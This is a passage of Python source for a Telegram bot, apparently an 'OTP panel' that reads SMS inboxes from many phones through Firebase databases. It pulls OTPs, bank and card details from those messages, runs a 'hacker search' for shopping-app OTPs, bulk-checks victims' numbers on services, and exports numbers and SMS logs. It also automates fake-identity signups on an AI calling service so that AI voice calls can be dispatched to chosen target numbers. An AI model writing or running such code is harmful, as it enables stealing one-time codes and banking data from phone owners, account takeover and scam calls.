        [InlineKeyboardButton("🛒 Flipkart", callback_data="app_search:flipkart"), InlineKeyboardButton("📦 Amazon", callback_data="app_search:amazon")],
        [InlineKeyboardButton("🟣 Zepto", callback_data="app_search:zepto"), InlineKeyboardButton("🟡 Blinkit", callback_data="app_search:blinkit")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ])

def device_list_header(devices: list[Device], page: int = 0) -> str:
    online  = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    progress = ""
    if SCAN_PROGRESS["completed"] < SCAN_PROGRESS["total"] and SCAN_PROGRESS["total"] > 1 and SCAN_PROGRESS["total"] != 99999:
        pct = int((SCAN_PROGRESS["completed"] / SCAN_PROGRESS["total"]) * 100)
        progress = f"🔄 Fast-Scan Progress: {SCAN_PROGRESS['completed']}/{SCAN_PROGRESS['total']} ({pct}%)\n"
    return f"<b>📱 OTP PANEL PRO DEVICES</b>\n━━━━━━━━━━━━━━━━━━\n{progress}🟢 Online: {online}   🔴 Offline: {offline}\n📊 Total: {len(devices)} Devices\n📄 Page {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\n<i>Select a number below:</i>"

def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page        = max(0, min(page, total_pages - 1))
    start       = page * PAGE_SIZE
    page_devs   = devices[start : start + PAGE_SIZE]
    
    rows = []
    row = []
    for d in page_devs:
        row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"sel:{d.id}"))
        if len(row) == 2:
            rows.append(row)
            row = []
    if row:
        rows.append(row)

    nav = []
    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="home"), InlineKeyboardButton("🟢 Online Only", callback_data="online")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online"]
    rows = []
    if online:
        row = []
        for d in online[:100]: 
            row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"sel:{d.id}"))
            if len(row) == 2:
                rows.append(row)
                row = []
        if row:
            rows.append(row)
    else: 
        rows.append([InlineKeyboardButton("📭 No devices online", callback_data="noop")])
        
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="online"), InlineKeyboardButton("📋 All Numbers", callback_data="pg:0")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def format_sms_block(sms: dict, num_label: str) -> tuple[str, Optional[str], Optional[str]]:
    body   = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp    = extract_otp(body)
    bank_info = extract_bank_info(body)
    card_info = extract_card_info(body)
    date   = sms_date(sms)
    sender = sms.get("sender") or "Unknown"
    
    lines  = []
    if otp: lines.append(f"🔐 <b>OTP:</b> {otp}")
    if bank_info: lines.append(f"🏦 <b>BANK:</b> {bank_info}")
    if card_info: lines.append(f"{card_info}")
    
    lines.append(f"👤 From: {sender}\n📅 Date: {date}")
    lines.append(f"Number: {num_label}\n\n💬 Message: {body}")
    return "\n".join(lines), otp, bank_info

def auto_forward_msg(sms: dict, num_label: str) -> str:
    body   = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp    = extract_otp(body)
    bank_info = extract_bank_info(body)
    date   = sms_date(sms)
    sender = sms.get("sender") or "Unknown"
    
    if bank_info: return f"🏦 <b>BANK SMS RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\n{bank_info}\n│ Number : {num_label}\n│ From : {sender}\n│ Date : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"
    if otp: return f"🔐 <b>NEW OTP RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\n│ OTP : {otp}\n│ Number : {num_label}\n│ From : {sender}\n│ Date : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"
    return f"📩 <b>NEW SMS RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\nNumber : {num_label}\nFrom : {sender}\nDate : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"

def admin_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel"), InlineKeyboardButton("Grant Global Access", callback_data="sa_grant_global")],
        [InlineKeyboardButton("Upload Panels (.txt)", callback_data="sa_upload_txt"), InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
        [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels"), InlineKeyboardButton("Export User Panels (.txt)", callback_data="sa_export_user_panels")],
        [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs"), InlineKeyboardButton("Refresh", callback_data="admin_refresh")],
        [InlineKeyboardButton("Close", callback_data="close_msg")]
    ])

async def safe_edit(query_or_msg, text, reply_markup=None, parse_mode=None, disable_web_page_preview=False):
    try:
        if hasattr(query_or_msg, 'edit_message_text'): await query_or_msg.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
        elif hasattr(query_or_msg, 'edit_text'): await query_or_msg.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
    except BadRequest: pass
    except Exception: pass

async def show_fresh_page(message_obj, chat_id, page, bot_token, users_db, duration_minutes):
    dev_ids = user_fresh_cache.get(chat_id, [])
    if not dev_ids:
        await safe_edit(message_obj, f"❌ <b>Error:</b> {duration_minutes}-Min Fresh List expired. Please scan again.", parse_mode="HTML")
        return

    total_devs = len(dev_ids)
    total_pages = max(1, (total_devs + PAGE_SIZE - 1) // PAGE_SIZE) 
    page = max(0, min(page, total_pages - 1))
    start = page * PAGE_SIZE
    page_ids = dev_ids[start:start+PAGE_SIZE]

    devices = await get_all_devices(bot_token, chat_id, users_db)
    dev_map = {d.id: d for d in devices}

    text = f"⚡ <b>{duration_minutes}-MIN FRESH INBOXES</b> ⚡\n━━━━━━━━━━━━━━━━━━\n✅ Total Active Numbers: {total_devs}\n📄 Page {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\n<i>Select a number to view OTP:</i>"

    kb = []
    row = []
    for did in page_ids:
        d = dev_map.get(did)
        if d:
            row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"sel:{d.id}"))
            if len(row) == 2:
                kb.append(row)
                row = []
    if row: kb.append(row)

    nav = []
    callback_prefix = "f5:" if duration_minutes == 5 else "f30:"
    if page > 0: nav.append(InlineKeyboardButton("⬅ Prev", callback_data=f"{callback_prefix}{page-1}"))
    nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"{callback_prefix}{page+1}"))
    if nav: kb.append(nav)
    
    kb.append([InlineKeyboardButton("🔄 Refresh", callback_data="home"), InlineKeyboardButton("🟢 Online Only", callback_data="online")])
    kb.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    await safe_edit(message_obj, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

# ==========================================
# 🤖 OMNIDIMENSION AI CALLER (PLAYWRIGHT)
# ==========================================
async def initiate_call(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    async def reply(txt, parse_mode="HTML"): await update.message.reply_text(txt, parse_mode=parse_mode)
    if not await enforce_access(context, chat_id, reply): return ConversationHandler.END
    await update.message.reply_text("📧 <b>OmniDimension Call Setup - Step 1:</b>\nApna Email Address bhejein OTP ke liye:", parse_mode="HTML")
    return WAIT_EMAIL

async def process_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = update.message.text.strip()
    wait_msg = await update.message.reply_text("⏳ Opening Auto-Chrome & Loading Page (Please wait up to 60s)...")
    
    password = generate_random_string(10) + "A1!"
    phone = generate_random_phone()
    name = generate_random_string(6)
    
    context.user_data['email'] = email
    context.user_data['password'] = password
    
    try:
        playwright = await async_playwright().start()
        context.user_data['playwright'] = playwright
        browser = await playwright.chromium.launch(headless=True) 
        context.user_data['browser'] = browser
        context.user_data['context'] = await browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        page = await context.user_data['context'].new_page()
        context.user_data['page'] = page
        
        await page.goto(f"https://omnidim.io/signup?ref={REFERRAL_CODE}", wait_until="domcontentloaded", timeout=60000)
        await page.locator('input[type="text"], input[name="name"]').first.fill(name, timeout=15000)
        await page.locator('input[type="email"], input[name="email"]').first.fill(email)
        await page.locator('input[type="tel"], input[name="phone"]').first.fill(phone)
        await page.locator('input[type="password"], input[name="password"]').first.fill(password)
        try: await page.locator('input[type="checkbox"]').first.check(timeout=2000)
        except: pass 
        await asyncio.sleep(1) 
        await page.locator('input[type="password"], input[name="password"]').first.press("Enter")
        try: await page.locator('button[type="submit"]').first.click(timeout=3000, force=True)
        except: pass
        
        await wait_msg.edit_text(f"✅ Auto-Chrome ne form bhar diya!\nOTP sent to <b>{email}</b>!\n\n📩 <b>Step 2:</b> Kripya OTP bhejein:", parse_mode="HTML")
        return WAIT_OTP
    except Exception as e:
        await wait_msg.edit_text(f"❌ <b>Error:</b>\n<pre>{str(e)[:200]}</pre>", parse_mode="HTML")
        return ConversationHandler.END

async def process_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp = update.message.text.strip()
    page = context.user_data.get('page')
    browser = context.user_data.get('browser')
    wait_msg = await update.message.reply_text("⏳ Entering OTP...")
    
    try:
        await page.locator('input[name="otp"], input[type="text"], input[type="number"]').last.fill(otp, timeout=15000) 
        await page.locator('button[type="submit"]').first.click()
        await asyncio.sleep(5) 
        
        cookies = await page.context.cookies()
        session_id = next((c['value'] for c in cookies if c['name'] == 'session_id'), None)
        if not session_id:
            await wait_msg.edit_text("❌ Session ID not found. OTP may be wrong.")
            await browser.close()
            return ConversationHandler.END
            
        context.user_data['session_id'] = session_id
        await browser.close() 
        
        email = context.user_data['email']
        password = context.user_data['password']
        await wait_msg.edit_text(f"🎉 <b>ACCOUNT CREATED!</b>\nEmail: <code>{email}</code>\nPass: <code>{password}</code>\n\n💬 <b>Step 3:</b> AI Agent ke liye Prompt bhejein:", parse_mode="HTML")
        return WAIT_PROMPT
    except Exception as e:
        await wait_msg.edit_text(f"❌ <b>Error:</b>\n<pre>{str(e)[:200]}</pre>", parse_mode="HTML")
        if browser: await browser.close()
        return ConversationHandler.END

async def process_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    prompt_text = update.message.text.strip()
    session_id = context.user_data.get('session_id')
    wait_msg = await update.message.reply_text("⏳ Generating AI Agent...")
    
    headers = {"Content-Type": "application/json", "Cookie": f"session_id={session_id}; omnidim_tenant=omnidim.io"}
    create_payload = {"prompt": prompt_text, "flow_type": "prompt"}
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post("https://omnidim.io/api/bot/create", json=create_payload, headers=headers) as resp:
                if resp.status in [200, 201]:
                    json_data = await resp.json()
                    new_bot_id = json_data.get("id")
                    if new_bot_id:
                        context.user_data['active_bot_id'] = new_bot_id
                        await wait_msg.edit_text(f"📱 <b>Step 4:</b> Agent Ready! (ID: {new_bot_id})\nAb <b>Target Phone Number</b> bhejein (Format: +919021333450):", parse_mode="HTML")
                        return WAIT_NUMBER
                    else:
                        await wait_msg.edit_text("❌ Agent Created but ID not found.")
                        return ConversationHandler.END
                else:
                    await wait_msg.edit_text(f"❌ Failed to create Agent. HTTP Code: {resp.status}")
                    return ConversationHandler.END
    except Exception as e:
         await wait_msg.edit_text(f"❌ API Error:\n<pre>{str(e)[:200]}</pre>", parse_mode="HTML")
         return ConversationHandler.END

async def process_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target_number = update.message.text.strip()
    active_bot_id = context.user_data.get('active_bot_id')
    session_id = context.user_data.get('session_id')
    
    if not target_number.startswith("+"): target_number = "+" + target_number
    wait_msg = await update.message.reply_text(f"🚀 Dispatching Call to <b>{target_number}</b>...", parse_mode="HTML")
    
    call_payload = {"user_number": target_number, "bot_id": active_bot_id, "custom_json_variables": {}}
    headers = {"Content-Type": "application/json", "Cookie": f"session_id={session_id}; omnidim_tenant=omnidim.io"}
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post("https://omnidim.io/api/bot/dispatch/call", json=call_payload, headers=headers, allow_redirects=False) as resp:
                if resp.status in [301, 302, 303]:
                    await wait_msg.edit_text("❌ <b>Call Failed:</b> Session expired. Try /call again.", parse_mode="HTML")
                elif resp.status in [200, 201]:
                    await wait_msg.edit_text(f"✅ <b>CALL INITIATED!</b>\nAI Agent is dialing <code>{target_number}</code> right now.\n\nType /call to run again.", parse_mode="HTML")
                else:
                    await wait_msg.edit_text(f"❌ <b>Call Failed.</b> (Code {resp.status})", parse_mode="HTML")
    except Exception as e:
        await wait_msg.edit_text(f"❌ Fatal Error:\n<pre>{str(e)[:200]}</pre>", parse_mode="HTML")
        
    return ConversationHandler.END

async def cleanup_browser(context: ContextTypes.DEFAULT_TYPE):
    try:
        c = context.user_data.get('context')
        browser = context.user_data.get('browser')
        playwright = context.user_data.get('playwright')
        if c: await c.close()
        if browser: await browser.close()
        if playwright: await playwright.stop()
    except: pass

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await cleanup_browser(context)
    await update.message.reply_text("Action cancelled. Session closed. Type /call to start over.")
    return ConversationHandler.END

# ═══════════════════════════════════════════════════════
#  CORE TELEGRAM HANDLERS
# ═══════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id  = update.effective_chat.id
    
    if chat_id not in all_users:
        all_users[chat_id] = {
            "name": update.effective_user.first_name, 
            "username": update.effective_user.username, 
            "joined_at": datetime.now().strftime("%d %b %Y"), 
            "referrals": 0, "access_until": 0, "global_trial_end": time.time() + 1800, "personal_trial_end": 0, 
            "has_global_access": False, "otp_count": 0, "custom_dbs": [], "selected_panel": "ALL"
        }
        text = update.message.text.split()
        if len(text) > 1 and text[1].isdigit():
            ref_id = int(text[1])
            if ref_id in all_users and ref_id != chat_id:
                all_users[ref_id]["referrals"] = all_users[ref_id].get("referrals", 0) + 1
                save_user(ref_id)
                try: await ctx.bot.send_message(ref_id, f"🎉 New user joined via your link! Total Referrals: {all_users[ref_id]['referrals']}/10")
                except: pass
        save_user(chat_id)
        
        try:
            msg = "🎉 <b>WELCOME BONUS!</b>\nAapko <b>30-Mins ka FREE Global VIP Access</b> mila hai! Aap sabhi admin panels aur numbers dekh sakte hain.\n\n<i>30 minute baad global numbers hide ho jayenge, uske baad '💳 Add Panel' karke apna Firebase daalne par aapko 1 Hour ka extra Personal Trial milega!</i>"
            await ctx.bot.send_message(chat_id, msg, parse_mode="HTML")
        except: pass

    if update.effective_chat.type == "private" and not await check_force_sub(ctx.bot, chat_id):
        await update.message.reply_text("🛑 <b>Aage badhne ke liye in channels ko join karna compulsory hai!</b>", parse_mode="HTML", reply_markup=force_sub_keyboard())
        return

    user_focus.setdefault(ctx.bot.token, {}).pop(chat_id, None)
    await update.message.reply_text(f"🔥 VANTAGE PANEL + OMNIDIMENSION BOT 🔥\n━━━━━━━━━━━━━━━━━━\nWelcome {update.effective_user.first_name}!\n\n👉 Type: /call to launch AI Voice Agent\n👉 Or use the menu below for OTP & Bank Panel.", reply_markup=get_reply_menu(chat_id))

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query   = update.callback_query
    data    = query.data or ""
    chat_id = query.message.chat_id
    bot_token = ctx.bot.token
    users_db = all_users

    if data == "verify_sub":
        if await check_force_sub(ctx.bot, chat_id):
            await safe_edit(query, "✅ Channels Verified! Welcome to the Bot.")
            await ctx.bot.send_message(chat_id, f"Welcome {query.from_user.first_name}!", reply_markup=get_reply_menu(chat_id))
        else:
            await query.answer("❌ Aapne abhi tak channels join nahi kiye hain!", show_alert=True)
        return

    if update.effective_chat.type == "private" and not await check_force_sub(ctx.bot, chat_id):
        await query.answer("Please join channels first!", show_alert=True)
        return

    await query.answer()

    try:
        if data == "noop": return
        if data == "close_msg":
            try: await query.message.delete()
            except: pass
            return
            
        protected_callbacks = ["open_app_search", "home", "online", "open_checker_menu", "open_auto_checker_menu"]
        if data in protected_callbacks or data.startswith(("app_search:", "auto_fb:", "f5:", "f30:", "chk_srv:", "pg:", "sel:", "msgs:", "info:")):
            async def edit_reply(txt, parse_mode="HTML"): await safe_edit(query, txt, parse_mode=parse_mode)
            if not await enforce_access(ctx, chat_id, edit_reply): return
            
        if data == "open_app_search":
            await safe_edit(query, "🍔 <b>SOCIAL & FOOD OTPs (Last 24h)</b>\n━━━━━━━━━━━━━━━━━━\nSelect an app below to deeply scan all devices for its OTPs:", reply_markup=get_app_search_menu(), parse_mode="HTML")
            return

        if data.startswith("auto_fb:"):
            service = data.split(":")[1]
            await safe_edit(query, f"⏳ <b>AUTO-CHECKING LIVE NUMBERS</b>\n━━━━━━━━━━━━━━━━━━\nScanning all online devices for <b>{service.capitalize()}</b>...\n<i>Please wait...</i>", parse_mode="HTML")
            
            all_devices = await get_all_devices(bot_token, chat_id, users_db)
            online_devs = [d for d in all_devices if d.status == "online" and d.numbers]
            
            if not online_devs:
                await safe_edit(query, "❌ Koi bhi number abhi online nahi hai.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="open_auto_checker_menu")]]))
                return
                
            target_nums = [d.numbers[0][-10:] for d in online_devs[:40]]
            bulk_results = []
            tasks = [check_number_api(service, num) for num in target_nums]
            res_list = await asyncio.gather(*tasks, return_exceptions=True)
            
            found_registered = 0
            for num, res in zip(target_nums, res_list):
                if isinstance(res, Exception) or res.get("status") == "error": continue
                is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                if is_reg:
                    found_registered += 1
                    bulk_results.append(f"🟢 <code>{num}</code> - Reg")
                else:
                    bulk_results.append(f"🔴 <code>{num}</code> - Unreg")
                    
            if not bulk_results:
                res_text = f"<b>📊 AUTO-CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n❌ API limit hit ya koi valid result nahi mila."
            else:
                res_text = f"<b>📊 AUTO-CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n✅ Checked: {len(bulk_results)} | 🎯 Reg: {found_registered}\n\n" + "\n".join(bulk_results[:30])
                    
            kb = [[InlineKeyboardButton("🔄 Scan Again", callback_data=f"auto_fb:{service}"), InlineKeyboardButton("🏠 Back", callback_data="open_auto_checker_menu")]]
            await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
            return

        if data.startswith("app_search:"):
            keyword = data.split(":")[1]
            await safe_edit(query, f"⏳ <b>HACKER SEARCH:</b> Scanning devices for <b>{keyword.upper()}</b> OTPs in the last 24 hours...\n\n<i>This might take 10-15 seconds. Please wait.</i>", parse_mode="HTML")
            
            all_devices = await get_all_devices(bot_token, chat_id, users_db)
            now = time.time()
            recent_devs = []
            for d in all_devices:
                ts = d.timestamp if d.timestamp < 1e11 else d.timestamp / 1000
                if (now - ts) <= 86400 or d.status == "online": recent_devs.append(d)
            
            found_devs = []
            async def check_dev_for_keyword(d: Device):
                try:
                    sms_data = await fb_get(f"{d.sms_path}", d.base_url, auth=d.auth, query='orderBy="%24key"&limitToLast=10')
                    if isinstance(sms_data, dict):
                        for k, sms in sms_data.items():
                            if not isinstance(sms, dict): continue
                            body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                            if keyword.lower() in body.lower(): return d
                except: pass
                return None

            for i in range(0, len(recent_devs), 20):
                batch = recent_devs[i:i+20]
                results = await asyncio.gather(*[check_dev_for_keyword(d) for d in batch])
                for res in results:
                    if res and res not in found_devs: found_devs.append(res)
                if len(found_devs) >= 15: break 
            
            if not found_devs:
                await safe_edit(query, f"📭 <b>NO RESULTS</b>\nKoi bhi <b>{keyword.upper()}</b> ka OTP pichle 24 ghante mein nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="open_app_search")]]), parse_mode="HTML")
                return
                
            rows, row = [], []
            for d in found_devs[:16]:
                row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"msgs:{d.id}"))
                if len(row) == 2:
                    rows.append(row)
                    row = []
            if row: rows.append(row)
                
            rows.append([InlineKeyboardButton("🔙 Back to Apps", callback_data="open_app_search")])
            text = f"🎯 <b>HACKER SEARCH RESULTS</b>\n━━━━━━━━━━━━━━━━━━\n🔎 App: <b>{keyword.upper()}</b>\n📱 Found in {len(found_devs)} devices (Last 24h)\n━━━━━━━━━━━━━━━━━━\nClick to view exact OTP:"
            await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")
            return

        if data.startswith("f5:"):
            page = int(data.split(":")[1])
            await show_fresh_page(query, chat_id, page, bot_token, users_db, 5)
            return

        if data.startswith("f30:"):
            page = int(data.split(":")[1])
            await show_fresh_page(query, chat_id, page, bot_token, users_db, 30)
            return

        if data == "open_checker_menu":
            await safe_edit(query, "<b>Select Checker (Manual Bulk)</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
            return

        if data == "open_auto_checker_menu":
            await safe_edit(query, "🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
            return

        if data.startswith("chk_srv:"):
            service = data.split(":")[1]
            pending_action[chat_id] = {"action": "check_number_input", "service": service}
            await safe_edit(query, f"Send a 10 digit number OR multiple numbers (separated by space) to manually check on {service.capitalize()}:")
            return

        if data == "sa_grant_global" and chat_id in ADMIN_IDS:
            pending_action[chat_id] = {"action": "grant_global"}
            await safe_edit(query, "Grant Global Access\n━━━━━━━━━━━━━━━━━━\nEnter the User ID you want to give global panel access to:\nCancel: /cancel")
            return

        if data == "sa_add_global_panel" and chat_id in ADMIN_IDS:
            pending_action[chat_id] = {"action": "sa_set_global_panel"}
            await safe_edit(query, "ADD GLOBAL PANEL\n━━━━━━━━━━━━━━━━━━\nApna Firebase URL (ya multiple URLs enter se separate karke) bhejein.\nFormat: URL|AUTH_TOKEN (Auth optional hai)\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_refresh")]]))
            return

        if data == "sa_upload_txt" and chat_id in ADMIN_IDS:
            pending_action[chat_id] = {"action": "upload_panels_txt"}
            await safe_edit(query, "UPLOAD PANELS (.txt)\n━━━━━━━━━━━━━━━━━━\nEk .txt file send karein jisme Firebase URLs ho.\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_refresh")]]))
            return

        if data == "sa_view_user_panels" and chat_id in ADMIN_IDS:
            msg_text = "USERS CUSTOM PANELS\n━━━━━━━━━━━━━━━━━━\n\n"
            for uid, uinfo in users_db.items():
                dbs = get_user_dbs(uinfo)
                if dbs:
                    msg_text += f"User: {uid}\n"
                    for db in dbs: msg_text += f"{db['url']}\n"
                    msg_text += "\n"
            if len(msg_text) > 4000: msg_text = msg_text[:4000] + "\n...[Truncated]"
            await safe_edit(query, msg_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_refresh")]]))
            return

        if data == "sa_export_user_panels" and chat_id in ADMIN_IDS:
            all_urls = set()
            for uinfo in users_db.values():
                for db in get_user_dbs(uinfo):
                    all_urls.add(db['url'])
            if not all_urls: return await query.answer("Koi user panel nahi mila.", show_alert=True)
            file_path = os.path.join(SYS_DIR, "User_Panels_Export.txt")
            with open(file_path, "w", encoding="utf-8") as f: f.write("\n".join(all_urls))
            await ctx.bot.send_document(chat_id=chat_id, document=open(file_path, "rb"), filename="All_User_Panels.txt", caption=f"Total Unique User Panels: {len(all_urls)}")
            return

        if data == "sa_export_numbers" and chat_id in ADMIN_IDS:
            devices = await get_all_devices(bot_token, chat_id, users_db)
            online_nums = [n for d in devices if d.status == "online" for n in d.numbers]
            if not online_nums: return await query.answer("Filhal koi bhi number online nahi hai.", show_alert=True)
            file_path = os.path.join(SYS_DIR, "Online_Numbers.txt")
            unique_online = set(online_nums)
            with open(file_path, "w", encoding="utf-8") as f: f.write("\n".join(unique_online))
            await ctx.bot.send_document(chat_id=chat_id, document=open(file_path, "rb"), filename="Active_Online_Numbers.txt", caption=f"Total Active Unique Numbers: {len(unique_online)}")
            return

        if data == "sa_download_logs" and chat_id in ADMIN_IDS:
            if not os.path.exists(SMS_LOG_FILE): return await query.answer("Log file abhi tak bani nahi hai.", show_alert=True)
            await ctx.bot.send_document(chat_id=chat_id, document=open(SMS_LOG_FILE, "rb"), filename="Master_SMS_Log.txt", caption="Master SMS Database Log")
            return

        if data == "admin_refresh" and chat_id in ADMIN_IDS:
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            total_u = len(all_users)
            msg = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total_u}\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
            await safe_edit(query, msg, reply_markup=admin_keyboard())
            return

        if data == "home":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            pending_action.pop(chat_id, None)
            devices = await get_all_devices(bot_token, chat_id, users_db)
            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
            return

        if data.startswith("pg:"):
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            page = int(data[3:])
            devices = await get_all_devices(bot_token, chat_id, users_db)
            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page), parse_mode="HTML")
            return

        if data == "online":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            devices = await get_all_devices(bot_token, chat_id, users_db)
            await safe_edit(query, f"<b>🟢 ONLINE NUMBERS</b>\n━━━━━━━━━━━━━━━━━━\nClick a number to connect:", reply_markup=online_only_keyboard(devices), parse_mode="HTML")
            return

        if data.startswith("cp:"):
            await query.answer(f"OTP: {data[3:]}", show_alert=True)
            return

        if data.startswith("sel:"):
            dev_id = data[4:]
            device = await find_device_by_id(dev_id, bot_token, chat_id, users_db)
            if not device: return await query.answer("Device not found! List purani ho gayi hai, refresh karein.", show_alert=True)
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "Online" if device.status == "online" else "Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = f"CONNECTED TO DEVICE\n━━━━━━━━━━━━━━━━━━\nNumber  : {label}\nStatus  : {status}\nBattery : {bat}\nServer  : {device.db_tag}\n━━━━━━━━━━━━━━━━━━\nYou are now receiving LIVE OTPs for this number."
            await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id))
            return

        if data.startswith("msgs:"):
            parts = data.split(":")
            dev_id = parts[1]

            device = await find_device_by_id(dev_id, bot_token, chat_id, users_db)
            if not device: return await query.answer("Device not found in active list! Refresh karein.", show_alert=True)
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            smss  = await get_device_sms(device)
            
            back_btn = InlineKeyboardButton("🔙 Back to Home", callback_data="home")
            refresh_btn = InlineKeyboardButton("🔄 Refresh Inbox", callback_data=data)
            
            if not smss:
                await safe_edit(query, f"📭 <b>Inbox Empty</b>\n📱 Number: {label}\nRefresh to check again.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]), parse_mode="HTML")
                return
                
            header = f"📩 DEEP INBOX SYNC (VANTAGE)\n━━━━━━━━━━━━━━━━━━\n📱 Number: {label}\n📄 Showing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n"
            body_parts, otp_buttons = [], []
            
            for sms in smss[:15]: 
                block, otp, bank_info = format_sms_block(sms, label)
                body_parts.append(block)
                if otp: otp_buttons.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
                
            full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n\n").join(body_parts)
            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[Truncated]"
            
            otp_buttons.append([refresh_btn, back_btn])
            await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons), parse_mode="HTML")
            return

        if data.startswith("info:"):
            dev_id = data[5:]
            device = await find_device_by_id(dev_id, bot_token, chat_id, users_db)
            if not device: return await query.answer("Device not found!", show_alert=True)
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "Online" if device.status == "online" else "Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = f"DEVICE DETAILS\n━━━━━━━━━━━━━━━━━━\nNumber  : {label}\nStatus  : {status}\nBattery : {bat}\nServer  : {device.db_tag}\n"
            for i, num in enumerate(device.numbers, 1): text += f"SIM {i}   : {num}\n"
            if device.device_info: text += f"\n{device.device_info}\n"
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("View Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Back", callback_data=f"sel:{dev_id}")], [InlineKeyboardButton("Disconnect & Back",  callback_data="home")]])
            await safe_edit(query, text, reply_markup=kb)
